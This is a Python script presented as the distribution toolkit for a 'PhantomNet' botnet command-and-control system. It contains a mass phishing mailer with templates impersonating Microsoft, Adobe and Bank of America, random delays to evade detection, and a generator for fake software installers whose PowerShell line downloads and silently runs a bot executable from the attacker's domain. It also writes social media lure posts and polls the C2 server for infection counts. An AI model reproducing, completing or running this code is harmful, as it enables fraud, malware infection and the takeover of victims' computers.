#!/usr/bin/env python3
"""
PhantomNet C2 - Distribution Tools
Advanced tools for spreading the botnet effectively
"""

import smtplib
import requests
import json
import random
import time
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

class PhantomDistributor:
    def __init__(self, domain, admin_email, smtp_config):
        self.domain = domain
        self.admin_email = admin_email
        self.smtp_config = smtp_config
        self.targets = []
        self.campaign_stats = {
            'emails_sent': 0,
            'successful_infections': 0,
            'failed_attempts': 0
        }
    
    def load_target_list(self, filename):
        """Load target email addresses from file"""
        try:
            with open(filename, 'r') as f:
                self.targets = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(self.targets)} targets from {filename}")
        except FileNotFoundError:
            print(f"[!] Target file {filename} not found")
    
    def generate_activation_code(self):
        """Generate unique activation code"""
        import secrets
        return secrets.token_urlsafe(16).upper()
    
    def create_phishing_email(self, target_email, activation_code, campaign_type="security_update"):
        """Create convincing phishing email"""
        
        templates = {
            "security_update": {
                "subject": "URGENT: Security Update Required - Account Compromise Detected",
                "sender": "security@microsoft.com",
                "body": f"""
Dear Valued Customer,

We have detected suspicious activity on your account that requires immediate attention.

Our security systems have identified multiple failed login attempts from unauthorized locations. 
To protect your account and personal information, we require immediate verification.

SECURITY ALERT: Your account has been temporarily restricted due to suspicious activity.

To restore access and secure your account, please:

1. Download the security verification tool: https://{self.domain}/activate
2. Enter your activation code: {activation_code}
3. Complete the security verification process

This is URGENT - Failure to verify within 24 hours will result in permanent account suspension.

Microsoft Security Team
Account Protection Division
                """
            },
            "software_update": {
                "subject": "Important Software Update - Critical Security Patch",
                "sender": "updates@adobe.com",
                "body": f"""
Hello,

Adobe has released a critical security update to address recently discovered vulnerabilities.

This update patches multiple security holes that could allow unauthorized access to your system.
We strongly recommend installing this update immediately.

Download the security patch: https://{self.domain}/activate
Activation Code: {activation_code}

This update is mandatory for all Adobe software users.

Adobe Security Team
                """
            },
            "banking_alert": {
                "subject": "Banking Security Alert - Unusual Activity Detected",
                "sender": "security@bankofamerica.com",
                "body": f"""
Dear Customer,

We have detected unusual activity on your account that requires immediate verification.

Multiple transactions have been flagged for review. To protect your funds and restore normal account access, 
please complete our enhanced security verification process.

SECURITY VERIFICATION REQUIRED:
Download verification tool: https://{self.domain}/activate
Verification code: {activation_code}

This verification must be completed within 2 hours to prevent account suspension.

Bank of America Security Team
                """
            }
        }
        
        template = templates.get(campaign_type, templates["security_update"])
        
        msg = MIMEMultipart()
        msg['From'] = template["sender"]
        msg['To'] = target_email
        msg['Subject'] = template["subject"]
        msg.attach(MIMEText(template["body"], 'plain'))
        
        return msg
    
    def send_phishing_email(self, target_email, activation_code, campaign_type="security_update"):
        """Send phishing email to target"""
        try:
            msg = self.create_phishing_email(target_email, activation_code, campaign_type)
            
            # Send email using configured SMTP
            with smtplib.SMTP(self.smtp_config['server'], self.smtp_config['port']) as server:
                if self.smtp_config.get('use_tls'):
                    server.starttls()
                server.login(self.smtp_config['username'], self.smtp_config['password'])
                server.send_message(msg)
            
            self.campaign_stats['emails_sent'] += 1
            print(f"[+] Email sent to {target_email} with code {activation_code}")
            
            # Log the attempt
            self.log_campaign_attempt(target_email, activation_code, "sent")
            
            return True
            
        except Exception as e:
            print(f"[!] Failed to send email to {target_email}: {e}")
            self.campaign_stats['failed_attempts'] += 1
            self.log_campaign_attempt(target_email, activation_code, "failed", str(e))
            return False
    
    def run_email_campaign(self, campaign_type="security_update", delay_range=(30, 120)):
        """Run email phishing campaign"""
        print(f"[+] Starting {campaign_type} campaign to {len(self.targets)} targets")
        
        for i, target_email in enumerate(self.targets):
            activation_code = self.generate_activation_code()
            
            success = self.send_phishing_email(target_email, activation_code, campaign_type)
            
            if success:
                # Random delay between emails to avoid detection
                delay = random.randint(*delay_range)
                print(f"[+] Waiting {delay} seconds before next email...")
                time.sleep(delay)
            
            # Progress update every 10 emails
            if (i + 1) % 10 == 0:
                print(f"[+] Progress: {i + 1}/{len(self.targets)} emails sent")
        
        self.print_campaign_summary()
    
    def create_fake_software_package(self, software_name, output_dir="fake_software"):
        """Create fake software installer with embedded bot"""
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        # Create fake installer script
        installer_script = f"""
@echo off
echo Installing {software_name}...
echo Please wait while we download and install the latest version...

REM Download bot payload
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://{self.domain}/download/bot.exe', '%TEMP%\\{software_name.lower()}_update.exe')"

REM Execute bot
start /min "%TEMP%\\{software_name.lower()}_update.exe"

echo Installation complete!
echo {software_name} has been successfully installed.
pause
"""
        
        # Create batch file
        installer_path = os.path.join(output_dir, f"{software_name}_installer.bat")
        with open(installer_path, 'w') as f:
            f.write(installer_script)
        
        print(f"[+] Created fake installer: {installer_path}")
        return installer_path
    
    def upload_to_file_sharing(self, file_path, platform="mega"):
        """Upload fake software to file sharing platforms"""
        platforms = {
            "mega": "https://mega.nz",
            "mediafire": "https://www.mediafire.com",
            "dropbox": "https://www.dropbox.com",
            "google_drive": "https://drive.google.com"
        }
        
        print(f"[+] Uploading {file_path} to {platform}")
        # Implementation would depend on specific platform APIs
        # This is a placeholder for the upload logic
        
        return f"https://{platform}.com/fake_download_link"
    
    def create_social_media_campaign(self, platform="twitter"):
        """Create social media distribution campaign"""
        messages = [
            f"Just found this amazing free software! Download here: https://{self.domain}/activate",
            f"URGENT: Critical security update needed. Get it here: https://{self.domain}/activate",
            f"Free antivirus software - protect your PC now: https://{self.domain}/activate",
            f"Latest Adobe Flash Player update: https://{self.domain}/activate",
            f"Windows security patch - download immediately: https://{self.domain}/activate"
        ]
        
        hashtags = ["#security", "#update", "#free", "#download", "#software", "#antivirus"]
        
        for message in messages:
            full_message = f"{message} {' '.join(random.sample(hashtags, 3))}"
            print(f"[+] Social media post: {full_message}")
            # Implementation would use platform-specific APIs
    
    def monitor_infections(self):
        """Monitor successful bot infections"""
        try:
            response = requests.get(f"https://{self.domain}/status", timeout=10)
            if response.status_code == 200:
                stats = response.json()
                print(f"[+] Current botnet status:")
                print(f"    Total bots: {stats.get('total_bots', 0)}")
                print(f"    Active bots: {stats.get('active_bots', 0)}")
                print(f"    Total commands: {stats.get('total_commands', 0)}")
                return stats
        except Exception as e:
            print(f"[!] Failed to get infection stats: {e}")
            return None
    
    def log_campaign_attempt(self, target_email, activation_code, status, error_msg=""):
        """Log campaign attempts for analysis"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "target_email": target_email,
            "activation_code": activation_code,
            "status": status,
            "error": error_msg
        }
        
        with open("campaign_log.json", "a") as f:
            f.write(json.dumps(log_entry) + "\n")
    
    def print_campaign_summary(self):
        """Print campaign statistics"""
        print("\n" + "="*50)
        print("CAMPAIGN SUMMARY")
        print("="*50)
        print(f"Emails sent: {self.campaign_stats['emails_sent']}")
        print(f"Failed attempts: {self.campaign_stats['failed_attempts']}")
        print(f"Success rate: {(self.campaign_stats['emails_sent'] / len(self.targets) * 100):.1f}%")
        print("="*50)

# Example usage
if __name__ == "__main__":
    # Configuration
    config = {
        "domain": "phantom.yourdomain.com",
        "admin_email": "admin@yourdomain.com",
        "smtp_config": {
            "server": "smtp.gmail.com",
            "port": 587,
            "username": "your_email@gmail.com",
            "password": "your_app_password",
            "use_tls": True
        }
    }
    
    # Initialize distributor
    distributor = PhantomDistributor(
        domain=config["domain"],
        admin_email=config["admin_email"],
        smtp_config=config["smtp_config"]
    )
    
    # Load targets
    distributor.load_target_list("targets.txt")
    
    # Run email campaign
    distributor.run_email_campaign(campaign_type="security_update")
    
    # Monitor results
    distributor.monitor_infections()
